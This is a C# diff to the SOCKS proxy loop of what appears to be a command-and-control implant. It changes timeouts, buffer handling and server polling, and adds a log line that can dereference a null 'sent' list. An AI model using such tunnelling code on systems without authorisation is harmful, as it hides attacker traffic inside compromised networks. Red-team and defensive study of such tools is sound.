@@ -19,7 +19,7 @@ namespace SocksProxy.Classes.Socks
         public IEncryptionHelper Encryption { get; set; }
         public CommandCommunicationHandler CmdCommshandler { get; set; }
         public AutoResetEvent Timeout = new AutoResetEvent(false);
-        static readonly ushort TOTALSOCKETTIMEOUT = 30000;
+        static readonly ushort TOTALSOCKETTIMEOUT = 5000;
         static readonly ushort TIMEBETWEENREADS = 500;
         static readonly ushort TIMEBETWEENSERVERSENDS = 500;
 
@@ -104,7 +104,8 @@ namespace SocksProxy.Classes.Socks
         bool ProxyLoop(String targetId)
         {
             List<byte> toSend = null;
-            bool timedOut = false;
+			List<byte> sent = null;
+			bool timedOut = false;
             bool connectionHasFailed = false;
             TargetInfo target = null;
             try
@@ -138,8 +139,9 @@ namespace SocksProxy.Classes.Socks
                         stream.Write(toSend.ToArray(), 0, toSend.Count());
                         stream.Flush();
                         ImplantComms.LogMessage($"Written {toSend.Count()} from client");
-                        //Clear out the data to send after it has been sent
-                        toSend = null;
+						//Clear out the data to send after it has been sent
+						sent = toSend;
+						toSend = null;
                     }
 
                     while ((null == toSend || toSend.Count() == 0) && !(timedOut =(timeoutCtr > (TOTALSOCKETTIMEOUT / TIMEBETWEENREADS))))
@@ -155,14 +157,12 @@ namespace SocksProxy.Classes.Socks
                             bytesRead = stream.Read(arrayBuffer, 0, 65535);
                             lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
 
-                            while (bytesRead > 0 && stream.DataAvailable)
+							arrayBuffer = new byte[65535];
+							while (bytesRead > 0 && stream.DataAvailable)
                             {
-                                arrayBuffer = new byte[65535];
                                 bytesRead = stream.Read(arrayBuffer, 0, 65535);
                                 lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
                             }
-
-							//   ImplantComms.HexDump(lstBuffer.ToArray(), 16);
 
 							if (lstBuffer.Count() > 0)
 							{
@@ -179,19 +179,17 @@ namespace SocksProxy.Classes.Socks
                         }
                         else
                         {
-                            timeout += TIMEBETWEENREADS;
-                            if (timeoutCtr > 1)
+                            timeout = TIMEBETWEENREADS;
+                            if (timeoutCtr > 5)
                             {
-                                //Nothing is being read from the server quick check to see if the client has anything
-                                serverTimeCtr += timeout;
-                                if ((serverTimeCtr % TIMEBETWEENSERVERSENDS) == 0)
+								//Nothing is being read from the server quick check to see if the client has anything
+								ImplantComms.LogMessage($" Nothing received after sending {sent.Count} bytes");
+
+								toSend = CmdCommshandler.Send(targetId, "nochange", null, out connectionDead);
+                                if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
                                 {
-									toSend = CmdCommshandler.Send(targetId, "nochange", null, out connectionDead);
-                                    if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
-                                    {
-										ErrorHandler.LogError($"Connection looks dead EXITING");
-										return connectionDead;
-                                    }
+									ErrorHandler.LogError($"Connection looks dead EXITING");
+									return connectionDead;
                                 }
                             }
                             Timeout.WaitOne(timeout);
